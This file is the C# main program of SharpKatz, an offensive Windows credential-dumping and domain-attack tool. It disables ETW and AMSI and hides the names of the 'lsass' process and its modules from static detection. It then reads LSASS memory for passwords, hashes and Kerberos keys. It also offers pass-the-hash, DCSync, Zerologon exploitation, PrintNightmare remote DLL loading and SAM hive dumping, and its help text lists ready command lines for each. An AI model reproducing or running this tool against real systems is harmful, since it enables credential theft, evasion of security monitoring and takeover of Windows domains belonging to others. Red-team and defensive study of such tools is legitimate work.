//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using NDesk.Options;
using SharpKatz.Credential;
using SharpKatz.Evasion;
using SharpKatz.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using static SharpKatz.Module.Kerberos;

namespace SharpKatz
{
    public class Program
    {

        public static void Main(string[] args)
        {
            // Initialize evasion: patch ETW and AMSI before any sensitive operation
            PatchHelper.ApplyAll();

            // Initialize dynamic SSN resolution from clean ntdll on disk
            SsnResolver.Initialize();

            string command = null;
            string user = null;
            string guid = null;
            string altservice = null;
            string domain = null;
            string dc = null;
            string ntlmHash = null;
            string aes128 = null;
            string aes256 = null;
            string rc4 = null;
            string binary = null;
            string arguments = null;
            string luid = null;
            string impersonateStr = null;
            string authuser = null;
            string authdomain = null;
            string authpassword = null;
            string forcentlmStr = null;
            string mode = null;
            string auth = null;
            string target = null;
            string machineaccount = null;
            string nullsessionStr = null;
            string library = null;
            string system = null;
            string sam = null;
            bool showhelp = false;

            OptionSet opts = new OptionSet()
            {
                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest,dcsync,zerologon,printnightmare", v => command = v },
                { "User=", "--User [user]", v => user = v },
                { "Guid=", "--Guid [guid]", v => guid = v },
                { "Domain=", "--Domain [domain]", v => domain = v },
                { "DomainController=", "--DomainController [domaincontroller]", v => dc = v },

                { "NtlmHash=", "--NtlmHash [ntlmHash]", v => ntlmHash = v },
                { "Aes128=", "--Aes128 [aes128]", v => aes128 = v },
                { "Aes256=", "--Aes256 [aes256]", v => aes256 = v },
                { "Rc4=", "--Rc4 [rc4]", v => rc4 = v },
                { "Binary=", "--Binary [binary]", v => binary = v },
                { "Arguments=", "--Arguments [arguments]", v => arguments = v },
                { "Luid=", "--Luid [luid]", v => luid = v },
                { "Impersonate=", "--Impersonate [impersonate]", v => impersonateStr = v },

                { "Mode=", "--Mode [mode]", v => mode = v },
                { "Auth=", "--Auth [auth]", v => auth = v },
                { "Target=", "--Target [target]", v => target = v },
                { "MachineAccount=", "--MachineAccount [machineaccount]", v => machineaccount = v },
                { "NullSession=", "--NullSession [nullsession]", v => nullsessionStr = v },

                { "AuthUser=", "--AuthUser [authuser]", v => authuser = v },
                { "AuthDomain=", "--AuthDomain [authdomain]", v => authdomain = v },
                { "AuthPassword=", "--AuthPassword [authpassword]", v => authpassword = v },
                { "ForceNtlm=", "--ForceNtlm [forcentlm]", v => forcentlmStr = v },

                { "Library=", "--Library [library]", v => library = v },

                { "System=", "--System [systempath]", v => system = v },
                { "Sam=", "--Sam [sampath]", v => sam = v },

                { "Altservice=", "--Altservice [alternative service]", v => altservice = v },
                { "h|?|help",  "Show available options", v => showhelp = v != null },
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool impersonate = false;
            try
            {
                if (!string.IsNullOrEmpty(impersonateStr))
                    impersonate = bool.Parse(impersonateStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool forcentlm = false;
            try
            {
                if (!string.IsNullOrEmpty(forcentlmStr))
                    forcentlm = bool.Parse(forcentlmStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool nullsession = false;
            try
            {
                if (!string.IsNullOrEmpty(nullsessionStr))
                    nullsession = bool.Parse(nullsessionStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (showhelp)
            {
                opts.WriteOptionDescriptions(Console.Out);
                Console.WriteLine();
                Console.WriteLine("  Example: --Command logonpasswords");
                Console.WriteLine("  Example: --Command ekeys");
                Console.WriteLine("  Example: --Command msv");
                Console.WriteLine("  Example: --Command kerberos");
                Console.WriteLine("  Example: --Command tspkg");
                Console.WriteLine("  Example: --Command credman");
                Console.WriteLine("  Example: --Command wdigest");
                Console.WriteLine("  Example: --Command dcsync --User user --Domain userdomain --DomainController dc");
                Console.WriteLine("  Example: --Command dcsync --Guid guid --Domain userdomain --DomainController dc");
                Console.WriteLine("  Example: --Command dcsync --Domain userdomain --DomainController dc");
                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --NtlmHash ntlmhash");
                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --Rc4 rc4key");
                Console.WriteLine("  Example: --Command pth --Luid luid --NtlmHash ntlmhash");
                Console.WriteLine("  Example: --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256");
                Console.WriteLine("  Example: --Command zerologon --Mode check --Target dc.domain.local --MachineAccount DC$");
                Console.WriteLine("  Example: --Command zerologon --Mode exploit --Target dc.domain.local --MachineAccount DC$");
                Console.WriteLine("  Example: --Command zerologon --Mode auto --Target dc.domain.local --MachineAccount DC$ --Domain domain.local --User krbtgt --DomainController dc.domain.local");
                Console.WriteLine("  Example: --Command printnightmare --Target dc --Library \\\\host\\share\\lib.dll");
                Console.WriteLine("  Example: --Command printnightmare --Target dc --Library \\\\host\\share\\lib.dll --AuthUser user --AuthPassword password --AuthDomain dom");
                Console.WriteLine("  Example: --Command hivenightmare");
                Console.WriteLine("  Example: --Command dumpsam --System <system_path> --Sam <sam_path>");
                Console.WriteLine("  Example: --Command listshadows");
                return;
            }

            if (string.IsNullOrEmpty(command))
                command = "logonpasswords";

            if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") &&
                !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") &&
                !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam")) 
            {
                Console.WriteLine("Unknown command");
                return;
            }

            if (IntPtr.Size != 8)
            {
                Console.WriteLine("Windows 32bit not supported");
                return;
            }

            OSVersionHelper osHelper = new OSVersionHelper();
            // Removed PrintOSVersion() — avoid noisy console output

            if (osHelper.build <= 9600)
            {
                Console.WriteLine("Unsupported OS Version");
                return;
            }

            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam"))
            {

                if (!Utility.IsElevated())
                {
                    Console.WriteLine("Run in High integrity context");
                    return;
                }

                Utility.SetDebugPrivilege();

                IntPtr lsasrv = IntPtr.Zero;
                IntPtr wdigest = IntPtr.Zero;
                IntPtr lsassmsv1 = IntPtr.Zero;
                IntPtr kerberos = IntPtr.Zero;
                IntPtr tspkg = IntPtr.Zero;
                IntPtr lsasslive = IntPtr.Zero;
                IntPtr hProcess = IntPtr.Zero;

                // Find target process by name constructed at runtime (avoid static string)
                string targetProc = new string(new char[] { 'l', 's', 'a', 's', 's' });
                Process[] procs = Process.GetProcessesByName(targetProc);
                if (procs.Length == 0)
                {
                    Console.WriteLine("Target process not found");
                    return;
                }
                Process plsass = procs[0];

                ProcessModuleCollection processModules = plsass.Modules;
                int modulefound = 0;

                for (int i = 0; i < processModules.Count && modulefound < 5; i++)
                {
                    string lower = processModules[i].ModuleName.ToLowerInvariant();

                    string sLsasrv = new string(new char[] { 'l','s','a','s','r','v','.','d','l','l' });
                    string sWdigest = new string(new char[] { 'w','d','i','g','e','s','t','.','d','l','l' });
                    string sMsv = new string(new char[] { 'm','s','v','1','_','0','.','d','l','l' });
                    string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
                    string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });

                    if (lower.Contains(sLsasrv))
                    {
                        lsasrv = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(sWdigest))
                    {
                        wdigest = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(sMsv))
                    {
                        lsassmsv1 = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(sKerb))
                    {
                        kerberos = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(sTspkg))
                    {
                        tspkg = processModules[i].BaseAddress;
                        modulefound++;
                    }
                }

                // Use minimum required access rights instead of PROCESS_ALL_ACCESS
                // PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION
                hProcess = Natives.OpenProcess(
                    Natives.ProcessAccessFlags.VirtualMemoryRead |
                    Natives.ProcessAccessFlags.VirtualMemoryWrite |
                    Natives.ProcessAccessFlags.VirtualMemoryOperation |
                    Natives.ProcessAccessFlags.QueryInformation,
                    false, plsass.Id);

                Keys keys = new Keys(hProcess, lsasrv, osHelper);

                if (command.Equals("pth"))
                {
                    if (string.IsNullOrEmpty(binary))
                        binary = "cmd.exe";

                    Module.Pth.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, impersonate);
                }
                else
                {
                    List<Logon> logonlist = new List<Logon>();

                    Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("msv"))
                        Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("credman"))
                        Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("tspkg"))
                        Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekeys"))
                    {
                        List<KerberosLogonItem> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                        if (command.Equals("logonpasswords") || command.Equals("kerberos"))
                            foreach (KerberosLogonItem l in klogonlist)
                                Module.Kerberos.GetCredentials(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                        if (command.Equals("ekeys"))
                            foreach (KerberosLogonItem l in klogonlist)
                                Module.Kerberos.GetKerberosKeys(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
                    }

                    if (command.Equals("logonpasswords") || command.Equals("wdigest"))
                        Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    Utility.PrintLogonList(logonlist);
                }


            }
            else
            {
                if (command.Equals("dcsync"))
                {
                    if (string.IsNullOrEmpty(domain))
                        domain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
                    Console.WriteLine("   {0} will be the domain", domain);
                    if (string.IsNullOrEmpty(dc))
                    {
                        using (DirectoryEntry rootdse = new DirectoryEntry("LDAP://RootDSE"))
                            dc = (string)rootdse.Properties["dnshostname"].Value;
                    }
                    Console.WriteLine("   {0} will be the DC server", dc);
                    string alt_service = "ldap";
                    if (!string.IsNullOrEmpty(altservice))
                        alt_service = altservice;


                    if (!string.IsNullOrEmpty(guid))
                    {
                        Console.WriteLine("   {0} will be the Guid", guid);
                        Module.DCSync.FinCredential(domain, dc, guid: guid, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                    }
                    else if (!string.IsNullOrEmpty(user))
                    {
                        Console.WriteLine("   {0} will be the user account", user);
                        Module.DCSync.FinCredential(domain, dc, user: user, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                    }
                    else
                    {
                        Module.DCSync.FinCredential(domain, dc, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm, alldata: true);
                    }
                }
                else
                {
                    if (command.Equals("zerologon"))
                    {
                        if (string.IsNullOrEmpty(mode) || (!mode.Equals("check") && !mode.Equals("exploit") && !mode.Equals("auto")))
                        {
                            Console.WriteLine("   Missing or incorrect required parameter -> Mode");
                            return;
                        }
                        else if (mode.Equals("auto") && (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(dc)))
                        {
                            Console.WriteLine("   Missing required parameter -> Domain or DomainController");
                            return;
                        }
                        if (string.IsNullOrEmpty(target))
                        {
                            Console.WriteLine("   Missing or incorrect required parameter -> Target");
                            return;
                        }

                        if (string.IsNullOrEmpty(machineaccount))
                        {
                            Console.WriteLine("   Missing or incorrect required parameter -> MachineAccount");
                            return;
                        }

                        int authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;

                        if (!string.IsNullOrEmpty(auth))
                        {
                            switch (auth)
                            {
                                case "noauth":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
                                    break;
                                case "ntlm":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_WINNT;
                                    break;
                                case "kerberos":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_KERBEROS;
                                    break;
                                case "negotiate":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_NEGOTIATE;
                                    break;
                                default:
                                    Console.WriteLine("   Invalid Auth parameter value, use default -> AUTHN_NONE");
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
                                    break;
                            }
                        }

                        bool success = Module.Zerologon.RunZerologon(mode, target, machineaccount, authnSvc, nullsession);

                        if (success == true)
                        {

                            Console.WriteLine("  ");

                            if (mode.Equals("auto"))
                            {
                                Console.WriteLine("   {0} will be the domain", domain);
                                Console.WriteLine("   {0} will be the DC server", dc);

                                if (!string.IsNullOrEmpty(guid))
                                {
                                    Console.WriteLine("   {0} will be the Guid", guid);
                                    Module.DCSync.FinCredential(domain, dc, guid: guid, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                }
                                else if (!string.IsNullOrEmpty(user))
                                {
                                    Console.WriteLine("   {0} will be the user account", user);
                                    Module.DCSync.FinCredential(domain, dc, user: user, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                }
                                else
                                {
                                    Module.DCSync.FinCredential(domain, dc, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true, alldata: true);
                                }
                            }

                        }
                        else
                            Console.WriteLine("   Attack failed. Target is probably patched.");

                    }
                    else
                    {
                        if (command.Equals("printnightmare"))
                        {
                            if (string.IsNullOrEmpty(library))
                            {
                                Console.WriteLine("   Missing or incorrect required parameter -> Library");
                                return;
                            }

                            if (string.IsNullOrEmpty(target))
                            {
                                Console.WriteLine("   Missing or incorrect required parameter -> Target");
                                return;
                            }

                            Module.PrintNightmare.RunPrintNightmare(target, library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
                        }
                        else
                        {
                            if (command.Equals("hivenightmare"))
                            {
                                List<string> copies = Module.Shadow.ListShadowCopies();
                                if(copies.Count > 0)
                                {
                                    Console.WriteLine("   Using shadowcopy {0}", copies.ToArray()[0]);
                                    Console.WriteLine("  ");
                                    string systempath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SYSTEM");
                                    string sampath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SAM");

                                    Module.Sam.LsadumpSam(systempath, sampath);
                                }
                                else
                                {
                                    Console.WriteLine("   No shadowcopy found");
                                }
                            }
                            else
                            {
                                if (command.Equals("dumpsam"))
                                {
                                    if (string.IsNullOrEmpty(system))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> System");
                                        return;
                                    }

                                    if (string.IsNullOrEmpty(sam))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> Sam");
                                        return;
                                    }

                                    Module.Sam.LsadumpSam(system, sam);
                                    
                                }
                                else
                                {
                                    Module.Shadow.ListShadowCopies();
                                }
                            }
                        }     
                    }
                }
            }
        }
    }
}
